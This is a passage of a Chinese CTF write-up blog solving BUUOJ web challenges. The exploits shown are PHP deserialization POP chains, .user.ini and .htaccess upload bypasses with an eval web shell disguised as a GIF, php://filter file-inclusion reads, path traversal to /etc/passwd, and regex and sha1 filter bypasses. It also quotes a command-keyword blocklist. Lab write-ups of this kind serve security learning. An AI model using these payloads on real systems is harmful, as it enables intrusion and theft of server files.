class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$B</span>=serialize(<span class="variable">$A</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$B</span>;</span><br></pre></td></tr></table></figure><p>接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件</p><p>$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p><p> 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span> = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><p>str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;s:1:”A”;}</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>知识点：</p><p>.user.ini。</p><ul><li>auto_append_file : 指定一个文件 , 自动包含在要执行的文件末尾 , 类似与在可执行文件末尾调用了 require() 函数</li><li>auto_prepend_file : 指定一个文件 , 自动包含在要执行的文件开头 , 类似与在可执行文件开头调用了 require() 函数</li></ul><h5 id="利用-user-ini漏洞的条件"><a href="#利用-user-ini漏洞的条件" class="headerlink" title="利用.user.ini漏洞的条件"></a>利用.user.ini漏洞的条件</h5><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li><strong>上传目录下要有可执行的php文件</strong></li></ul><p>该题对</p><p><strong>exif_imagetype:not imag</strong> 这是因为题目用exif_imagetype进行了检测，判断是否是图片文件。</p><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title="user.ini文件"></a>user.ini文件</h4><p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><p>gif89a 为图片头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#user.ini</span></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.gif</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.gif</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就可以用菜刀连了。但是它会不时的清除文件，所以链接的不是很稳定，甚至有是时候连不上，但我们可以在网页执行命令。所以我第一次就是在页面执行了命令，找到了flag：<br>扫描根目录：shell=var_dump(scandir(“/“));，我们可以可以看见一个叫flag的文件<br>打印：shell=var_dump(file_get_contents(“/flag”));</p><p>eg：</p><p><a href="http://70446d7d-2c88-4c36-92d2-eedf67a8703b.node3.buuoj.cn/uploads/7da8cd499a49031eb076ec11e9e2aab3/index.php?shell=var_dump(file_get_contents(&quot;/flag&quot;)">http://70446d7d-2c88-4c36-92d2-eedf67a8703b.node3.buuoj.cn/uploads/7da8cd499a49031eb076ec11e9e2aab3/index.php?shell=var_dump(file_get_contents(&quot;/flag&quot;)</a>);</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>最初的htaccess文件是不能上传的，我改了Content-Type后才能上传，但说明能上传htaccess文件，</p><p>htaccess文件：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>原理：他没有过滤 .htaccess后缀，我们可以构建一个htaccess配置文件，让所有格式文件都解析为php，然后再上传图片马（只要后缀是允许的，随便都可以）就会被解析了。</p><p>文件内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传.htaccess文件<br>最好把type改成image/jpeg类型</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/.htaccess succesfully uploaded!</p><p>上传.jpg文件马</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/php.jpg succesfully uploaded!</p><p>最后用蚁剑连</p><p><a href="http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg">http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg</a></p><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>注册</p><p>登录</p><p>传了一个gif</p><p>看到可以访问目录</p><p>cookiebase64解密 得序列化</p><p>怎么是png</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#x31;&#x32;&#x33;&#52;&#53;&#54;&#64;&#49;&#46;&#x63;&#x6f;&#109;">&#x31;&#x32;&#x33;&#52;&#53;&#54;&#64;&#49;&#46;&#x63;&#x6f;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:79:”../upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png”;}</p><p>试试能不能页面跳转</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#x31;&#50;&#51;&#52;&#x35;&#x36;&#64;&#49;&#x2e;&#99;&#111;&#109;">&#x31;&#50;&#51;&#52;&#x35;&#x36;&#64;&#49;&#x2e;&#99;&#111;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:31:”../../../../../../../etc/passwd”;}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>/<span class="title">web</span>/<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/qwe.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register()</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>__construct()//当一个对象创建时被调用</p><p>__destruct() //当一个对象销毁时被调用</p><p>__toString() //当一个对象被当作一个字符串使用</p><p>__sleep()//在对象在被序列化之前运行</p><p>__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p><p>__get()//获得一个类的成员变量时调用</p><p>__set()//设置一个类的成员变量时调用</p><p>__invoke()//调用函数的方式调用一个对象时的回应方法</p><p>__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数</p><p>此处用到的主要是__toString()，__wakeup()，__get()，__invoke()，</p><p>2.</p><p>类中，private变量与protected变量序列化后，变量名会有些异常，</p><p>private变量经反序列化后为\x00 + 类名 + \x00 + 变量名；</p><p>protected变量经反序列化后为，\x00 + * + \x00 + 变量名；</p><p>3.</p><p>列化操作只是保存对象(不是类)的变量，不保存对象的方法，其实反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的。我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到序列化</p><p>O:4:”Show”:2:{s:6:”source”;O:4:”Show”:2:{s:6:”source”;N;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”*var”;s:52:”php://filter/convert.base64-encode/resource=flag.php”;}}}s:3:”str”;N;}</p><p>进行urlencode</p><p>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p><p>得到base64</p><p>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezQ3MWE5ZmQ0LWUzZGYtNDRiNi04ZDhjLTU4Mjc0MGU4M2ZmYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;471a9fd4-e3df-44b6-8d8c-582740e83ffb&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>观察URL 修改category值看到报错 include</p><p>文件包含漏洞</p><p>?category=php://filter/convert.base64-encode/resource=index</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要对伪协议进行嵌套，加入一个可以通过的关键词然后进行flag读取</p><p>?category=php://filter/convert.base64-encode/resource=woofers/../flag</p><p>或</p><p>?category=php://filter/convert.base64-encode/index/resource=flag</p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p><strong>知识点</strong></p><ul><li>绕过QUERY_STRING url编码</li><li><code>preg_match(&#39;/^$/&#39;)</code>用换行符%0a绕过</li><li><code>$_REQUEST</code>绕过</li><li>file_get_contents函数绕过</li><li>sha1数组绕过</li><li>create_function注入</li></ul><p>GFXEIM3YFZYGQ4A= base32解码 得到1nD3x.php</p><p>看源码六个if语句</p><p>最后包含flag.php</p><h3 id="第一个if"><a href="#第一个if" class="headerlink" title="第一个if"></a>第一个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123;<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>绕过**’QUERY_STRING’**，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会进行urldecode，<code>$_GET[]</code>会，用url编码绕过</p><ul><li>$_SERVER[“QUERY_STRING”] =&gt; “id=1”，查询字符串，不存在为” “</li></ul><h3 id="第二个if"><a href="#第二个if" class="headerlink" title="第二个if"></a>第二个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"><span class="comment"># /^aqua_is_cute$/  ^匹配开始  $匹配结束</span></span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/^$/&#39;)</code>用换行符%0a绕过</p><p>debu=aqua_is_cute%0a</p><h3 id="第三个if"><a href="#第三个if" class="headerlink" title="第三个if"></a>第三个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>$_REQUEST</code>绕过，$_REQUEST在同时接收GET和POST参数时，POST优先级更高</p><h3 id="第四个if"><a href="#第四个if" class="headerlink" title="第四个if"></a>第四个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents`函数，用data伪协议绕过`file=data://text/plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><h3 id="第五个if"><a href="#第五个if" class="headerlink" title="第五个if"></a>第五个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sha1()函数无法处理数组，$shana和$passwd都是数组时都是false。<code>$shana[]=1&amp;$passwd[]=2</code></p><p>exc</p><p><code>file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute &amp;shana[]=1&amp;passwd[]=2</code></p><p><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code></p><h3 id="第六个if"><a href="#第六个if" class="headerlink" title="第六个if"></a>第六个if</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 